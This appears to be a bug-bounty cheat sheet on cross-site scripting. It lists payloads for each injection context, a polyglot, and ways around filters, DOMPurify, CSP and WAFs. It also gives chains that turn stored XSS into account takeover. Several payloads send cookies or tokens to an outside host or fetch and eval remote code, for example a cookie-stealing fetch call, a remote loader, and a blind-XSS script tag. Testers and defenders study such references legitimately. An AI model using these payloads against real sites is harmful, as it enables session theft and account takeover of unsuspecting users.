# Cross-Site Scripting (XSS)

**TL;DR**: your input executes as JS in a victim's browser. Identify the reflection **context** before choosing the payload. Harmless PoC: `alert(document.domain)`. Real impact = session theft / actions as the victim / ATO.

## Types
- **Reflected**: input echoed immediately in the response (trap link).
- **Stored**: persistent input (profile, comment, name, ticket) executed for other users. More severe.
- **DOM-based**: source→sink client-side, often without hitting the server (`location.hash`, `document.write`).
- **Blind**: stored and executed in a context you cannot see (admin panel, logs) → OOB.
- **Self-XSS**: only executes for yourself; chain it (CSRF/login) to get paid.
- **mXSS**: mutation via DOM re-parsing (sanitizer bypassed after normalization).

## Where to look
- Any input reflection: search, errors, names, profiles, comments, reflected `Referer`/`User-Agent`, titles, upload filenames, pre-filled form values, redirects, JSON re-injected into the DOM.
- DOM sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(str)`, `Function`, `location`, `jQuery.html()`, `insertAdjacentHTML`, framework bindings (`v-html`, `dangerouslySetInnerHTML`, Angular `[innerHTML]`/template injection).
- DOM sources: `location.*`, `document.URL`, `referrer`, `postMessage`, `window.name`, `localStorage`.

## Method
1. Inject a **unique marker** (`caido9182`) into each param, find where/how many times it comes out.
2. Determine the exact **context** of the reflection.
3. Send the context breakout characters (`< > " ' ` / etc.), see which pass unescaped.
4. Build the minimal adapted payload.

## Payloads by context
- **HTML body**: `<script>alert(document.domain)</script>`; if `<script>` filtered: `<img src=x onerror=alert(document.domain)>`, `<svg onload=alert(document.domain)>`, `<details open ontoggle=alert()>`, `<video><source onerror=alert()>`.
- **Attribute** (`value="INPUT"`): break the attribute `"><svg onload=alert()>`; if quotes filtered but inside an event handler: `" autofocus onfocus=alert() x="`.
- **In a tag, no breakout**: `" onmouseover=alert() "`.
- **JS string** (`var x='INPUT'`): `';alert(document.domain)//` or `\';alert()//`, `</script><script>alert()</script>`.
- **JS template/backtick**: `${alert(document.domain)}`.
- **URL/href** (`<a href="INPUT">`): `javascript:alert(document.domain)`.
- **DOM sink**: depends on the sink; via `#` (hash) often not sent to the server → test client-side.

## Polyglot (unknown context)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
Also: `'"><img src=x onerror=alert()>` as a fast first probe.

## Filter / sanitizer bypass
- Alt tags/handlers: hundreds exist (`onpointerover`, `onanimationstart` + CSS, `onbeforetoggle`).
- Case & whitespace: `<ScRiPt>`, `<img/src=x/onerror=alert()>`, `<img\tsrc`.
- Encoding: HTML entities in attributes (`&#97;lert`), URL-encode in `javascript:`, unicode.
- No parentheses: `onerror=alert` + `throw`, backtick call, `<script>alert` + backtick.
- No whitespace: `/` as separator.
- Non-recursive stripping: `<scr<script>ipt>`, `<img src=x on<x>error=alert()>`.
- CSP present: look for whitelisted JSONP endpoints, gadgets (Angular/Vue), missing `base-uri`, `unsafe-inline`, reused nonce, same-origin `.js` upload. See CSP bypass refs.
- WAF: see `00_WAF_ENCODING.md`.

## Beating a sanitizer (DOMPurify & co.)
- Check the **version** (known bugs / mXSS via SVG/MathML, namespace confusion).
- mXSS: `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert()>`.
- Permissive config (custom `ALLOWED_TAGS`, SVG allowed).

## CSP - check before claiming victory
- Read the `Content-Security-Policy` header. `unsafe-inline` / `unsafe-eval` / wildcard / `data:` / JSONP domain = often bypassable.
- **Whitelisted JSONP** (Google/Twitter/FB, etc.): `"><script src=https://accounts.google.com/o/oauth2/revoke?callback=PAYLOAD></script>`. Ready-made callbacks: JSONBee (https://github.com/zigoo0/JSONBee).
- **Missing `base-uri`**: `<base href='http://VPS/'>` reroutes every relative-path script to your host.
- **`connect-src 'none'`** (blocks fetch/XHR exfil): exfil via an auto-submitting `<form method=POST action=http://VPS>` carrying `document.cookie`.
- **Dangling markup** (scriptless, when script itself is blocked): an unclosed `<img/link/meta/table background=...` pointing at your host leaks the following HTML (incl. tokens) as a URL. Refs: HackTricks CSP-bypass + dangling-markup.

## Escalation / impact (responsible PoC)
- Session theft: only if the cookie is non-`HttpOnly`; otherwise show a sensitive action (exfil CSRF token, change email via the API as the victim).
- ATO: XSS in the admin panel (stored/blind) = critical.
- Do NOT exfiltrate real user data; use your own account/collaborator as proof.
- Keylogger/BeEF = overkill for a report; a `fetch('//collab/'+document.cookie)` PoC on your own account is enough.

## Real-world payloads & chains
- **Remote loader** (tiny payload, logic on your server): `<img src=x onerror="fetch('//you').then(r=>r.text()).then(eval)">`, `$.getScript('//you')`, `<script src=//you></script>`.
- **Property-name obfuscation** (beats keyword WAFs): `window['\u0066\u0065\u0074\u0063\u0068'](...)` for `fetch`, `\x` escapes, concat `a='//';b='you';fetch(a+b)`.
- **Function hoisting** (slip past validators by (re)defining expected names): `';function alert(){}...`, redefine `atob`/`$`/`console`.
- **Angular sandbox escape**: `{{$on.constructor('alert(1)')()}}` / `{{constructor.constructor('alert(1)')()}}`.
- **Markdown/link contexts**: `[x](javascript:alert(document.domain))`, `?returnPath=javascript:alert(document.cookie)`.
- **Cloudflare-style WAF**: some sinks pass while others 403; probe which `javascript:` funcs are allowed (`console.log` often ok), then wrap the real payload in an allowed function.
- **XSS -> ATO via same-origin hidden iframe**: inject a 0x0 iframe to `/profile`, in `onload` fill the change-email/phone fields and click submit (same-origin, no CORS). Turns any stored XSS into account takeover.

## Blind XSS
- Inject OOB payloads (`'"><script src=//xss.report/x></script>`, XSSHunter-like, or collaborator) into: names, addresses, user-agent, support/ticket fields, feedback. Wait for the callback (admin context).

## Caido
- Automate: unique marker per param → grep-match on the reflection, note the context.
- JS is not rendered in Caido: to **confirm DOM execution**, open in Chrome (via the extension) and observe the alert/console.

## References
- PortSwigger - XSS - https://portswigger.net/web-security/cross-site-scripting
- PortSwigger - XSS cheat sheet (interactive) - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- PortSwigger - DOM XSS / sources & sinks - https://portswigger.net/web-security/dom-based
- PayloadsAllTheThings - XSS - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- OWASP - XSS Prevention & DOM XSS Cheat Sheets - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP - Content Security Policy Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- CSP bypass reference - https://github.com/0xInfection/AdvancedCSPBypass
- HackTricks - XSS - https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/
